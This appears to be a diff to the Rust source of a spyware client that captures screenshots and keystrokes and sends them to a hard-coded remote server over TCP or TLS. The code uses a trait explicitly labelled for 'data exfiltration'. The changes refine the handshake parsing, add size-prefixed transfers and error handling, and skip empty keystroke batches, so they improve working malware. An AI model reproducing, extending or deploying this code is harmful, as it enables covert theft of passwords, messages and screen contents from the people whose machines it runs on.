@@ -6,6 +6,7 @@ extern crate kernel32;
 use scrap::{Capturer, Display};
 use std::io::{Read, Write};
 use std::io::ErrorKind::WouldBlock;
+use std::convert::TryInto;
 use std::thread;
 use std::sync::mpsc::channel;
 use std::time::Duration;
@@ -18,7 +19,6 @@ use crate::pool::Pool;
 
 const REMOTE_DOMAIN: &str = "10.0.0.9";
 const SIGNAL_SIZE: usize = 4;
-// TCP SYN: | compression_quality (4) | frame_time_ms(4) | size = 8
 const SYN_SIZE: usize = 8;
 const REMOTE_PORT: i32 = 443;
 enum TcpData {Keys(Vec<u8>), Screenshot(Vec<u8>)}
@@ -41,21 +41,14 @@ pub struct TCPSocketClient {
     compression_quality: f32
 }
 
-fn build_from_init(buf: Vec<u8>) -> (i32, i32) {
-    assert!(buf.len() == SYN_SIZE);
-    println!("{:?}", buf);
-    let mut frame_arr = [0u8; 4];
-    let mut comp_arr = [0u8; 4];
-    frame_arr[0] = buf[0]; frame_arr[1] = buf[1];
-    frame_arr[2] = buf[2]; frame_arr[3] = buf[3];
-    comp_arr[0] = buf[4]; comp_arr[1] = buf[5];
-    comp_arr[2] = buf[6]; comp_arr[3] = buf[7];
-    println!("{:?} : {:?} -> {} , {}", 
-        frame_arr, comp_arr,
-        i32::from_be_bytes(frame_arr),
-        i32::from_be_bytes(comp_arr)
-    );
-    (i32::from_be_bytes(frame_arr), i32::from_be_bytes(comp_arr))
+// TCP SYN: | signal (4) | data (4) |
+// there is potential for some issues if the client tries to send a file
+// that is greater than 2.1GB large but it should be fine for this ;)
+fn build_data(buf: Vec<u8>) -> (i32, i32) {
+    let (a, b) = buf.split_at(4);
+    let left: [u8; 4] = a.try_into().unwrap();
+    let right: [u8; 4] = b.try_into().unwrap();
+    (i32::from_be_bytes(left), i32::from_be_bytes(right))
 }
 
 // trait for data exfiltration (tcp / tls)
@@ -73,7 +66,11 @@ pub trait Exfil {
             _ => {}
         };
     }
-    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>);
+    fn send_on_ack(
+        &mut self,
+        signal: &TcpSignalClient,
+        ack: i32,
+        data: Vec<u8>) -> Result<(), i32>;
     fn frame_time(&self) -> u128;
     fn comp_quality(&self) -> f32;
 }
@@ -87,7 +84,7 @@ impl TCPSocketClient {
         let mut buf = vec![0u8; SYN_SIZE];
         nossl_stream.write(&1i32.to_be_bytes()).unwrap();
         nossl_stream.read(&mut buf).unwrap();
-        let (frame_time_ms, compression_quality) = build_from_init(buf);
+        let (frame_time_ms, compression_quality) = build_data(buf);
         match frame_time_ms != 0 && compression_quality != 0 {
             true => {
                 nossl_stream.write(&2i32.to_be_bytes()).unwrap();
@@ -106,20 +103,38 @@ impl TCPSocketClient {
 }
 
 impl Exfil for TCPSocketClient {
-    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>) {
+    fn send_on_ack(
+        &mut self,
+        signal: &TcpSignalClient,
+        ack: i32,
+        data: Vec<u8>
+    ) -> Result<(), i32>
+    {
         let mut res = [0u8; SIGNAL_SIZE];
+        let mut out = vec![];
         let sig_int = *signal as u8;
         let sig_out = *&sig_int as i32;
+        let size    = data.len() as i32;
+        out.extend(&sig_out.to_be_bytes());
+        out.extend(&size.to_be_bytes());
+        println!("{:?}", out);
         self.sock
-            .write(&sig_out.to_be_bytes())
+            .write(&out)
             .unwrap();
         self.sock
             .read(&mut res)
             .unwrap();
         if i32::from_be_bytes(res) == ack {
-            println!("Writing {:?}b", data.len());
             self.sock.write(&data).unwrap();
-        }
+            let mut reply = [0u8; SIGNAL_SIZE];
+            self.sock.read(&mut reply);
+            if i32::from_be_bytes(reply) != 1 { 
+                // if the server sends anything else then we're no longer synchronized
+                // so we're going to stop and we can restart later
+                self.sock.write(&4i32.to_be_bytes()); 
+                return Err(i32::from_be_bytes(reply))
+            }
+        } Ok(())
     }
     fn frame_time(&self) -> u128 { self.frame_time }
     fn comp_quality(&self) -> f32 { self.compression_quality }
@@ -142,7 +157,7 @@ impl TLSSocketClient {
         let mut buf = vec![0u8; SYN_SIZE];
         ssl_stream.write(&1i32.to_be_bytes()).unwrap();
         ssl_stream.read(&mut buf).unwrap();
-        let (frame_time_ms, compression_quality) = build_from_init(buf);
+        let (frame_time_ms, compression_quality) = build_data(buf);
         match frame_time_ms != 0 && compression_quality != 0 {
             true => {
                 ssl_stream.write(&2i32.to_be_bytes()).unwrap();
@@ -162,7 +177,13 @@ impl TLSSocketClient {
 }
 
 impl Exfil for TLSSocketClient {
-    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>) {
+    fn send_on_ack(
+        &mut self,
+        signal: &TcpSignalClient,
+        ack: i32,
+        data: Vec<u8>
+    ) -> Result<(), i32>
+    {
         let mut res = [0u8; SIGNAL_SIZE];
         let sig_int = *signal as u8;
         self.sock
@@ -175,7 +196,7 @@ impl Exfil for TLSSocketClient {
             self.sock
                 .ssl_write(&data)
                 .unwrap(); 
-        }
+        } Ok(())
     }
     fn frame_time(&self) -> u128 { self.frame_time }
     fn comp_quality(&self) -> f32 { self.compression_quality }
@@ -280,10 +301,12 @@ where T: Exfil
                         match receiver.recv() {
                             Ok(data) => match data{
                                 TcpData::Keys(keys) => {
-                                    socket.send(
-                                        TcpSignalClient::StartSendKeys,
-                                        Some(keys)
-                                    )
+                                    if keys.len() != 0 {
+                                        socket.send(
+                                            TcpSignalClient::StartSendKeys,
+                                            Some(keys)
+                                        )
+                                    }
                                 },
                                 TcpData::Screenshot(scr) => {
                                     socket.send(
@@ -294,9 +317,9 @@ where T: Exfil
                             },
                             Err(_) => {}
                         }
-                    }
+                    } break;
                 },
-                false => {}
+                false => { }
             }
         }
     }
